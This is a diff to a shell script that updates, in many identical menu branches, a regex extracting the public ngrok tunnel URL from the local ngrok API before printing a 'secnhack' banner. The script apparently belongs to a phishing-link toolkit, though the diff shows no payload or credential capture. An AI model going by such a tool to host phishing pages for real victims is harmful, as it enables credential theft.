@@ -54,7 +54,7 @@ echo ""
                            sleep 25
                            clear
                            echo ""
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                            echo ""
                            echo ""
                            cat secnhack
@@ -101,7 +101,7 @@ echo ""
                            sleep 25
                            clear
                            echo ""
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                            echo ""
                            echo ""
                            cat secnhack
@@ -195,7 +195,7 @@ echo ""
                            sleep 25
                            clear
                            echo ""
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                            echo ""
                            echo ""
                            cat secnhack
@@ -243,7 +243,7 @@ echo ""
                            sleep 25
                            clear
                            echo ""
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                            echo ""
                            echo ""
                            cat secnhack
@@ -290,7 +290,7 @@ echo ""
                            sleep 25
                            clear
                            echo ""
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                            echo ""
                            echo ""
                            cat secnhack
@@ -348,7 +348,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -391,7 +391,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -440,7 +440,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -488,7 +488,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -535,7 +535,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -581,7 +581,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -628,7 +628,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -674,7 +674,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -721,7 +721,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -767,7 +767,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -813,7 +813,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -860,7 +860,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -908,7 +908,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -955,7 +955,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -1001,7 +1001,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -1047,7 +1047,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -1093,7 +1093,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -1140,7 +1140,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -1187,7 +1187,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -1234,7 +1234,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -1282,7 +1282,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -1330,7 +1330,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -1377,7 +1377,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -1423,7 +1423,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -1470,7 +1470,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -1518,7 +1518,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
@@ -1564,7 +1564,7 @@ echo ""
                           sleep 25
                           clear
                           echo ""
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
                           echo ""
                           echo ""
                           cat secnhack
